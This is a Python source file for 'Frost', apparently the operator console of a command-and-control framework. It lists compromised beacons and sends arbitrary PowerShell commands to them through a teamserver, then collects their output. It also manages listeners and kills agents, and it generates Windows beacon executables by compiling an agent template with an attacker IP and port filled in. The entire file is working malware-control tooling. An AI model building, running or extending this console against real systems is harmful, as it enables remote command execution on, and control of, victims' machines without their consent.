from requests.exceptions import ConnectionError
from rich.console        import Console as csle
from rich.table          import Table
from contextlib          import redirect_stderr
from colorama            import init, Fore, Back, Style
from time                import sleep

import subprocess
import threading
import argparse
import readline
import requests
import random
import string
import shlex
import json
import uuid
import cmd
import io
import os

RESET = Style.RESET_ALL
BLUE  = Style.BRIGHT + Fore.BLUE
CYAN  = Style.BRIGHT + Fore.CYAN

HISTFILE = './.console_history'
HISTFILE_SIZE = 10000

class FrostShell( cmd.Cmd ):

    def __init__( self, server, port ):
        super().__init__()
        self.SERVER          = server
        self.PORT            = port
        self.BASEURL         = f"http://{self.SERVER}:{self.PORT}"

        self.current_agent   = ""
        self.intro           = BLUE + "Hee-ho! ❄️\n"
        self.prompt          = BLUE + "(Frost)> " + RESET

        self.completed_tasks = set()
        self.known_agents    = set()
        self.timestamps      = dict()
        self.listeners       = dict()
        self.console         = csle()
        self.agents          = dict()
        self.tasks           = list()
        self.tid             = 0


    def do_beacons( self, any ):
        '\nLists Beacons\n'

        table   = Table(
                        title="[ Beacons ]", 
                        title_justify="left", 
                        title_style="bold cyan"
                       )
        columns = ["Name","UUID","Last Seen"]

        if  ( self.agents == {} ) :
              self.console.print(f"[bold red]\nNo agents found!\n")

        else:
            for column in columns:
                table.add_column(column, style="bold steel_blue3", justify="center", no_wrap=True)

            for id in self.agents.keys():
                table.add_row(self.agents[id], id, self.timestamps[id])

            print('')
            self.console.print(table)
            print('')

        self.postloop()
        return

    def do_send( self, cmd:str ) -> None :
        """
        Send self.tasks\n
            Usage:
                send <CMD> (powershell -c <CMD>)\n
        """
        # Check for empty command
        if ( str( cmd ).strip() == "" ):
            self.console.print(f"[bold red]No command given!\n")
            self.postloop()
            return

        if ( self.current_agent not in self.agents.keys() ) :
            self.console.print(f"[bold red]Interact with an agent first. Hint: [bold cyan]interact\n")
            self.postloop()
            return
 
        # Send task to server
        data = {
                "AgentId":f"{ self.current_agent }",
                "cmd"    :f"{ f'powershell -c {cmd}' }"
               }

        req        = requests.post( f"{self.BASEURL}/tasks", json=data )
        response   = req.json()
        self.tid   = response["TaskId"]
 
        # Save task id to list and get results
        self.tasks.append( self.tid )

        self.postloop()
        self.get_results()


    def get_results( self ):
        """
        Get results from the server
        """
        if ( self.tid in self.completed_tasks ) or ( int( self.tid ) <= 0 ): # Only get results for uncompleted tasks
                        self.postloop()
                        return

        output = None
        print('')
        with self.console.status(f"[bold blue]Task { self.tid } sent!\n", spinner="earth"):

                for _ in range( 16 ) :
                    try:
                        results = requests.get(f"{self.BASEURL}/results?tid={self.tid}").json()

                        # Print results if task isnt in the self.completed_tasks set
                        if  ( results  and 
                              results["TaskId"] not in self.completed_tasks  and 
                              results["results"] != "__NULL__"               and 
                              results["results"] != "NONE" 
                             ):
                                self.completed_tasks.add( results["TaskId"] )
                                output = ( 
                                           f"[bold cyan]Agent { results["AgentId"].split("-")[0] }: Task { results["TaskId"] }" 
                                           f" Output\n{"="*30}\n{ results["results"]}\n"
                                         ) 
                                break

                    except requests.exceptions.ConnectionError:
                            self.console.print(f"[bold red]Could not connect to teamserver!")
                            self.do_exit( 1 )
                    except ( json.decoder.JSONDecodeError, KeyError ):
                            None
                    sleep(1)
                else: 
                     self.console.print("[bold red]Task timed out! [bold cyan]hint: Listener or beacon probably down\n")

        if output:
                self.console.print( output )

        self.postloop()
        return

    def do_use( self, id:int ) -> None :
        """
        Interact with a beacon\n
            Usage:
                use <id/name>\n
        """
        # Check if id is in the agents dict
        match ( id in self.agents.keys(), id in self.agents.values() ):

            case ( True, False ):
                self.current_agent = id # Change current_agent to uid given
                self.prompt        = BLUE + f"(Frost:{CYAN}{ id.split("-")[0] }{BLUE})> "  + RESET
                self.console.print(f"[bold cyan]\nAgent { id } selected.\n")

            case ( False, True):
                self.current_agent = [ uid for uid in self.agents.keys() if self.agents[uid] == id ][0] # Change current_agent to uid of the name given
                self.prompt        = BLUE + f"(Frost:{CYAN}{ id }{BLUE})> "  + RESET
                self.console.print(f"[bold cyan]\nAgent { id } selected.\n")

            case _ :
                self.console.print(f"[bold red]\nAgent name or id not valid!\n")

        self.postloop()

    def do_kill( self, id:str ) -> None :
        """
        kill a beacon\n
            Usage:
                kill <id>\n
        """

        # Prompt for confirmation
        def confirm( killed:int ) -> None:
                if ( self.console.input(f"[bold red]\nAre you sure? [bold cyan]Y/[N] ").lower() == "y" ):
                        requests.post( f"{self.BASEURL}/kill", json={"AgentId":f"{ killed }"} )
                        self.console.print(f"[bold cyan]\nAgent { killed } killed.\n")
                else:
                    print("")
                    return

        if ( id == self.current_agent ) and ( self.current_agent != "" ):
                    self.console.print("[bold red]\nYou can't kill the current agent! Hint: [bold cyan]background\n")
                    self.postloop()
                    return

        # Check if id int agents dict
        match ( id in self.agents.keys(), id in self.agents.values() ):
            case ( True, False ) :
                del self.agents[id]
                confirm( id )

            case ( False, True) :
                del self.agents[ [x for x in self.agents.keys() if self.agents[x] == id][0] ]
                confirm( id )

            case _ :
                self.console.print(f"[bold red]\nAgent id not valid!\n")

        self.postloop()
        return


    def do_rename( self, arg:list[str] ) -> None :
        """
        Rename a beacon\n
            Usage:
                rename rename [-h] [-t TARGET] [-r NAME] \n
        """

        parser = argparse.ArgumentParser(prog="rename", description="Rename an agent")


        parser.add_argument( '-t', '--target', help='Old name of the agent', required=True )
        parser.add_argument( '-n', '--name'  , help='New name of the agent', required=True )

        arguments = self.parse(arg)

        # Catch stderr from argparse
        args, error = self.argparseFail( parser, arguments )
        if error or args is None:
            print( error )
            self.postloop()
            return

        oldName = args.target
        name    = args.name

        # Check if oldName is in the dict
        match ( oldName in self.agents.keys(), oldName in self.agents.values() ):

            case ( True, False ):
                   # change prompt if selectd is in use
                   if  self.current_agent == oldName:
                       self.prompt        = BLUE + f"(Frost:{CYAN}{ name }{BLUE})> "  + RESET

                   self.agents[oldName] =  name
                   requests.post( f"{self.BASEURL}/beacons/update", json={"AgentId":f"{ oldName }","Name":f"{ name }"} )

                   self.console.print(f"[bold cyan]\nAgent renamed...\n")

            case ( False, True ):

                   uuid = [x for x in self.agents.keys() if self.agents[x] == oldName]
                   try:
                       # change prompt if selected is in use
                       if uuid[0] == self.current_agent:
                           self.current_agent = uuid[0]
                           self.prompt        = BLUE + f"(Frost:{CYAN}{ name }{BLUE})> "  + RESET

                       self.agents.update( {uuid[0] : name })

                       self.console.print(f"[bold cyan]\nAgent renamed...\n")
                       requests.post( f"{self.BASEURL}/beacons/update", json={"AgentId":f"{ uuid[0] }","Name":f"{ name }"} )
                   except IndexError:
                       self.console.print(f"[bold red]\nAgent name or id not valid!\n")

            case _ :
                self.console.print(f"[bold red]\nAgent name or id not valid!\n")


        self.postloop()
        return

    def do_generate( self, arg:str ) -> None :
        """
        Create a beacon\n
            Usage:
                generate --ip IP --port PORT [--name NAME] [--debug]\n
        """
        parser = argparse.ArgumentParser(prog="generate", description="Generate a beacon")

        parser.add_argument( '-i', '--server', help='Target IP'         , required=True )
        parser.add_argument( '-p', '--port'  , help='Target port'       , required=True )
        parser.add_argument( '-n', '--name'  , help='Name of the beacon', default=f'')
        parser.add_argument( '-d', '--debug' , help='Enable debug mode' , action='store_true')
        parser.add_argument( '-s', '--save'  , help='Save the beacon to specified path', default='./')

        arguments = self.parse( arg )

        # Catch stderr from argparse
        args, error = self.argparseFail( parser, arguments )
        if error or args is None:
            print( error )
            self.postloop()
            return

        targetPath = args.save
        targetPort = args.port
        targetIp   = args.server
        debug      = args.debug
        name       = args.name or ''.join( random.choices( string.ascii_letters + string.digits, k=6) ) # Choose a random name if no name is given

        # Replace the template with given arguments
        with open("../Agent/agent.cpp", "r") as template:
            contents = template.read()

            contents = contents.replace("SERVER_HERE",targetIp)
            contents = contents.replace("PORT_HERE"  ,targetPort)

            if not debug:
                contents = contents.replace("#define DEBUG", "")
            else:
                self.console.print(f"[bold cyan]Debug mode enabled")

        # Try to compile the template 
        print('')
        with self.console.status(f"[bold cyan]Generating beacon: {name}.exe", spinner="earth"):
            with open("./template.cpp", "w") as copy:
                copy.write(contents)
            try:
                subprocess.run(["x86_64-w64-mingw32-g++",
                                "./template.cpp", 
                                "-I","../Agent/",
                                "-l","winhttp",
                                "-static",
                                "-std=c++17", 
                                "-o", f"{targetPath}/{name}.exe"], check=True)
            except subprocess.CalledProcessError:
                self.console.print(f"[bold red]\nFailed to compile beacon!\n")
                self.postloop()
                return

            os.remove("./template.cpp")
            self.console.print(f"[bold cyan]\nBeacon built at {targetPath}/{name}.exe\n")

            self.postloop()
            return

    def do_listener( self, arg:str ) -> None :
         """
         Create a listener\n
             Usage:
                 listener --ip IP --port PORT\n
         """
         parser = argparse.ArgumentParser(prog="generate", description="Generate a beacon")

         parser.add_argument( '-r', '--remove', help='Remove a listener', action='store_true' )
         parser.add_argument( '-i', '--server', help='Target IP'        , default=self.SERVER )
         parser.add_argument( '-p', '--port'  , help='Target port'      , required=True       )
         parser.add_argument( '-a', '--add'   , help='Add a listener'   , action='store_true' )

         arguments = self.parse( arg )

        # Catch stderr from argparse
         args, error = self.argparseFail( parser, arguments )
         if error or args is None:
             print( error )
             return

         remove = args.remove
         server = args.server
         port   = args.port
         add    = args.add

         if ( server == self.SERVER and port == self.PORT ) :
             self.console.print(f"[bold red]\nYou can't listen on the same port as the server!\n")
             self.postloop()
             return

        # check if add or remove is selected
         match ( remove, add ):

             case ( True, True ) :
                    self.console.print(f"[bold red]\nYou can't remove and add a listener at the same time!\n")

             case ( True, False ) : 
                    response = requests.post( f"{self.BASEURL}/listener/remove", json={"host":server ,"port":port } ).json()
                    if response["returned"] != "success" or response["returned"] == "null": 
                       self.console.print(f"[bold red]\n{response['returned']}\n")

                    else:
                       self.console.print(f"[bold cyan]\nSuccessfully removed listener on http://{server}:{port}\n")

             case ( False, True ) :
                    response = requests.post( f"{self.BASEURL}/listener/add", json={"host":server ,"port":port } ).json()
                    if response["returned"] != "success":
                         self.console.print(f"[bold red]\n{response['returned']}\n")
                    else:
                       self.console.print(f"[bold cyan]\nSuccessfully created listener on http://{server}:{port}\n")

             case _ :
                  self.console.print("[bold red]\n [ -r --remove ] or [ -a --add ] is needed!\n")

         self.postloop()
         return

    def do_background( self, id:int ) -> None :
        """
        background the current beacon\n
        Usage:
            background <id>\n
        """
        # Background if the the argument is in the dict
        if ( self.current_agent in self.agents.keys() ) or ( self.current_agent in self.agents.values() ):
             self.console.print(f"[bold cyan]\nBackgrounding agent...\n")
             self.current_agent = 0
             self.prompt        = BLUE + "(Frost)> " + RESET
        else:
            self.console.print(f"[bold red]\nNo agent to background\n")

        self.postloop()
        return

    def do_listener_list( self, any ) -> None :
        """
        List listeners
        """
        table   = Table(
                        title="[ Listeners ]", 
                        title_style="bold cyan", 
                        title_justify="left"
                        )
        columns = ["IP","PORT"]

       # Send a request to refresh the self.listeners dict 
        response = requests.get( f"{self.BASEURL}/listener/add?sync=true" ).json()
        if response:
            self.listeners = dict( response["listeners"] )

            if ( self.listeners == {} ) :
                self.console.print(f"[bold red]\nNo listeners found!\n")

            else: 
                for column in columns:
                    table.add_column(column, style="bold steel_blue3", justify="center", no_wrap=True)

                for ip, port in self.listeners.items():
                    table.add_row( ip, str(port) )
                print('')
                self.console.print( table )
                print('')
        else:
            self.console.print(f"[bold red]\nNo listeners found!\n")

        self.postloop()
        return

    def do_exit( self, any ) -> None :
        """
        Exit the program
        """
        self.console.print(f"[bold blue]\nBye ☃️\n")
        self.postloop()
        os._exit( 1 )

    def emptyline( self ) -> None :
        pass

    def parse( self, arg:str ) -> list[str] :
        """
        Split Arguments into a list
        """
        return shlex.split( arg )

    def argparseFail( self, parser:str, arglist:argparse.ArgumentParser ) -> tuple[argparse.Namespace, str]:
         """
         Catch argparse stderr
         """
         with io.StringIO() as buf, redirect_stderr( buf ):
             try:
                 args = parser.parse_args( arglist )
                 return args, None
             except SystemExit:
                 return None, buf.getvalue()

    def preloop( self ) -> None :
        """
        Read history file
        """
        if readline :
            try:
                readline.read_history_file( HISTFILE )
            except FileNotFoundError:
                open( HISTFILE, "a" ).close()
        return

    def postloop( self ) -> None :
        """
        Write history file
        """
        if readline:
            readline.set_history_length( HISTFILE_SIZE )
            readline.write_history_file( HISTFILE )
        return
